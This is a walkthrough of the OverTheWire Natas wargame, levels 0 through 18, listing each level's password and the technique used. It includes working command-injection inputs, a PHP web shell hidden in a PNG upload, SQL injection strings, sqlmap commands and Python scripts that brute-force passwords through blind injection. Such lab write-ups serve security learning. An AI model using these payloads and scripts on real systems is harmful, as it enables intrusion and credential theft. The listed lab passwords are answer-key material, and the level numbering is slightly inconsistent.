Natas0:
go to http://natas0.natas.labs.overthewire.org
Ctrl+U to read source code
<!--The password for natas1 is g9D9cREhslqBKtcA2uocGHPfMZVzeFK6 -->
password: g9D9cREhslqBKtcA2uocGHPfMZVzeFK6


Natas1:
Ctrl+U again
password: h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7


Natas2:
If you inspect the source code, you see a pixel in /files/pixel.png
go to http://natas2.natas.labs.overthewire.org/files
the flag is in http://natas2.natas.labs.overthewire.org/files/user.txt
password: G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q


Natas3:
Ctrl+U and you see
<!-- No more information leaks!! Not even Google will find it this time... -->
so we are going to http://natas3.natas.labs.overthewire.org/robots.txt
User-agent: *
Disallow: /s3cr3t/
password: tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm


Natas4:
Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
So we send this to Burp Repeater and change the Referer header to "http://natas5.natas.labs.overthewire.org/"
password: Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD


Natas5:
There is a cookie called "login", change its value to 1
password: fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR


Natas6:
View source code and then go to http://natas6.natas.labs.overthewire.org/includes/secret.inc
password: jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr


Natas7:
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
the page parameter goes to the specified file on the server. therefore:
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
password: a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB


Natas8:
<?php
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>

we create the function decodeSecret:
<?php
function decodeSecret($secret) {
    return base64_decode(strrev(hex2bin($secret)));
}
print decodeSecret($encodedSecret);
?>

The secret is "oubWYf2kBq"
password: Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd


Natas9:
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>

so we input something like "a /etc/natas_webpass/natas10", so that we execute
> grep -i a /etc/natas_webpass/natas10 dictionary.txt
we get
password: D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE


Natas10:
same trick work again, we input "a /etc/natas_webpass/natas11".
password: 1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg


Natas11:
we have
<?

$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);
?>

and the website has the cookie "data", with value $cookie = "MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY%3D".
if we decode base64 decoded it, we get ($cookie XOR $key) = "0l;$$98-8=?#9*jvi 'ngl*+(!$#9lrnh(.*-(.n67".
so we just have to do the operation ($cookie) XOR ($cookie XOR $key) = $key to obtain the $key, which is "KNHL".
then we change
$malicious_data = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff");
and print the corresponding encrypted cookie:
$malicious_cookie = base64_encode(xor_encrypt(json_encode($malicious_data), "KNHL"));

if we base64 decode
base64 decoded 0l;$$98-8=?#9*jvi 'ngl*+(!$#9lrnh(.*-()n67
password: YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG


Natas13:
<?php
function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

inspecting the source code, we see that we need to modify the extension of the hidden POST request to have ".php" extension
then we upload a malicious ".php" file

shellcmd.php
---------------------------------
<?php system($_GET['cmd']); ?>  |
---------------------------------

we receive "The file upload/p7ht605awt.php has been uploaded".
we do
http://natas12.natas.labs.overthewire.org/upload/a32lyfq18m.php?cmd=cat /etc/natas_webpass/natas13
password: lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9


Natas14:
In this case we have to hide php code in some image file.
Just get some small size png file for example. I got mc-down.png from github.com/matmarqs/gamedev
edit it with vim, or append the php code with
echo "<?php system(\$_GET['cmd']); ?>" >> mc-down.png
then upload this malicious png image to the server. don't forget to moidify the extension of the POST form to ".php"
we get "The file upload/snkhtb0ecy.php has been uploaded".
then we go to
http://natas13.natas.labs.overthewire.org/upload/snkhtb0ecy.php?cmd=ls
password: qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP


Natas15:
Basic SQL injection. Inspect the source code, and we can enter
------------------------+
Username: a" OR 1=1;#   |
Password: asd           |
------------------------+
password: TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB


Natas16:
we see that we have a boolean based SQL Injection
The username=natas16 exists
If we were to manually do the SQLi, we would insert payloads to discover the password
username=natas16" and password like "a%"

After playing with sqlmap args a lot, we use the command
sqlmap -u "http://natas15.natas.labs.overthewire.org/index.php?debug" --data="username=natas16" --auth-type=Basic --auth-cred=natas15:TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB --string="This user exists" --flush-session --level=5 --risk=3 --proxy="http://127.0.0.1:8080" -D natas15 -T users -C username,password --dump

sqlmap gives us:

Database: natas15
Table: users
[4 entries]
+----------+----------------------------------+
| username | password                         |
+----------+----------------------------------+
| bob      | 6P151OntQe                       |
| charlie  | HLwuGKts2w                       |
| alice    | hROtsfM734                       |
| natas16  | TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V |
+----------+----------------------------------+

I also wrote my own SQL Injection script in python:
----------------------------------------------------------------------------------------------------------------------------------+
import requests                                                                                                                   |
                                                                                                                                  |
url = 'http://natas15.natas.labs.overthewire.org/index.php?debug=True'                                                            |
headers = {'Host': 'natas15.natas.labs.overthewire.org',                                                                          |
           'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0',                                |
           'Authorization': 'Basic bmF0YXMxNTpUVGthSTdBV0c0aURFUnp0QmNFeUtWN2tSWEgxRVpSQg=='}                                     |
characters = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"                                                     |
                                                                                                                                  |
# like is boolean                                                                                                                 |
# attempt is the password attempt                                                                                                 |
def send_payload(attempt, like):                                                                                                  |
    if like:                                                                                                                      |
        query = f'password LIKE BINARY "{attempt}%'                                                                               |
    else:                                                                                                                         |
        query = f'password = BINARY "{attempt}'                                                                                   |
    payload = {'username': f'natas16" and {query}'}                                                                               |
    r = requests.post(url, data=payload, headers=headers)                                                                         |
    raw = str(r.content)                                                                                                          |
    return "This user exists." in raw                                                                                             |
                                                                                                                                  |
passwd = ""; found = False                                                                                                        |
while not found:                                                                                                                  |
    for c in characters:                                                                                                          |
        correct = send_payload(passwd + c, like=True)                                                                             |
        print("attempting:", passwd+c)                                                                                            |
        if correct:                                                                                                               |
            passwd += c                                                                                                           |
            print("GOT IT:", passwd)                                                                                              |
            found = send_payload(passwd, like=False)                                                                              |
            break                                                                                                                 |
                                                                                                                                  |
print("\nThe password is", passwd)                                                                                                |
----------------------------------------------------------------------------------------------------------------------------------+
The BINARY is important because SQL queries are case-insensitive by default.

password: TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V


Natas17:
This challenge is very similar to the previous one.
We have the source code:
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>

Because $key is between \"\" and they do not permit the characters [;|&`'"], we have to inject commands via $()
one clever way to do this is
$(grep ^a /etc/natas_webpass/natas17)zigzag

The 'zigzag' word is in dictionary.txt.
If the first character of the password is 'a', the command $(grep ^a /etc/natas_webpass/natas17) evaluates to <password>, and the query becomes
grep -i "<password>zigzag" dictionary.txt
This would not correspond to any match in the dictionary.
If the character '^a' is not in the password, the command $(grep ^a /etc/natas_webpass/natas17) evaluates to the empty string, and the query becomes
grep -i "zigzag" dictionary.txt
which returns the zigzag word.

Therefore, we make a python script that makes HTTP requests looking for the password.
I will make use of my previous script, the only difference is that it is no SQL Injection any more. It is a Bash injection. But it still is Boolean based.

dict_request.py
-----------------------------------------------------------------------------------------------------------------------------------------------------+
import requests                                                                                                                                      |
                                                                                                                                                     |
url = 'http://natas16.natas.labs.overthewire.org/index.php?debug=True'                                                                               |
# url = http://natas16.natas.labs.overthewire.org/?needle=%24%28grep+a+%2Fetc%2Fnatas_webpass%2Fnatas17%29zigzag&submit=Search                       |
headers = { 'Authorization': 'Basic bmF0YXMxNjpUUkQ3aVpyZDVnQVRqajlQa1BFdWFPbGZFakhxajMyVg=='}                                                       |
characters = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"                                                                        |
                                                                                                                                                     |
# attempt is the password attempt                                                                                                                    |
def send_payload(attempt, like):                                                                                                                     |
    if like:   # regex ^password                                                                                                                     |
        url = f'http://natas16.natas.labs.overthewire.org/?needle=%24%28grep+%5E{attempt}+%2Fetc%2Fnatas_webpass%2Fnatas17%29zigzag&submit=Search'   |
    else:      # regex ^password$                                                                                                                    |
        url = f'http://natas16.natas.labs.overthewire.org/?needle=%24%28grep+%5E{attempt}%24+%2Fetc%2Fnatas_webpass%2Fnatas17%29zigzag&submit=Search'|
    r = requests.get(url, headers=headers)                                                                                                           |
    raw = str(r.content)                                                                                                                             |
    return "zigzag" not in raw                                                                                                                       |
                                                                                                                                                     |
passwd = ""; found = False                                                                                                                           |
while not found:                                                                                                                                     |
    for c in characters:                                                                                                                             |
        correct = send_payload(passwd + c, like=True)                                                                                                |
        print("attempting:", passwd+c)                                                                                                               |
        if correct:                                                                                                                                  |
            passwd += c                                                                                                                              |
            print("GOT IT:", passwd)                                                                                                                 |
            found = send_payload(passwd, like=False)                                                                                                 |
            break                                                                                                                                    |
                                                                                                                                                     |
print("\nThe password is", passwd)                                                                                                                   |
-----------------------------------------------------------------------------------------------------------------------------------------------------+
Notice that our program now makes a GET request, but it functions with the same logic.

password: XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd


Natas18:
The only differences between this one and Natas15 are the commented lines

if(mysqli_num_rows($res) > 0) {
    //echo "This user exists.<br>";
} else {
    //echo "This user doesn't exist.<br>";
}
} else {
    //echo "Error in query.<br>";
}

This turns the Boolean based SQL Injection into a Blind Time-based SQL Injection.
I will not write a script for this, because it seems complicated, but sqlmap will certainly take care of this for us

sqlmap -u "http://natas17.natas.labs.overthewire.org/index.php?debug" --data="username=natas18" --auth-type=Basic --auth-cred=natas17:XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd --level=5 --risk=3 --proxy="http://127.0.0.1:8080" --dbms=mysql

sqlmap -u "http://natas17.natas.labs.overthewire.org/index.php?debug" --data="username=natas18" --auth-type=Basic --auth-cred=natas17:XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd --level=5 --risk=3 --proxy="http://127.0.0.1:8080" -D natas17 -T users -C username,password --dump --dbms=mysql

password: 8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq
